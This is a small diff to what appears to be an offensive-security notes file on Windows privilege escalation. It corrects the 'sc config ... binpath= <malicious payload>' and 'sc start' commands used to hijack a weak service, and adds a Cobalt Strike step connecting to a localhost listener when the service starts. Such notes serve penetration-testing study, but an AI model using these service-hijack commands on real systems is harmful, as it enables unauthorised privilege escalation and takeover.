@@ -27,6 +27,14 @@ sc qc <service name>
 - restart the service
 
 ```
-sc config <service name> binpath=<malicious payload>
+sc config <service name> binpath= <malicious payload>
 sc start <servicename>
+```
+
+## Cobalt Strike
+
+- Use a TCP localhost then connect to it when the service runs
+
+```
+connect localhost <port>
 ```
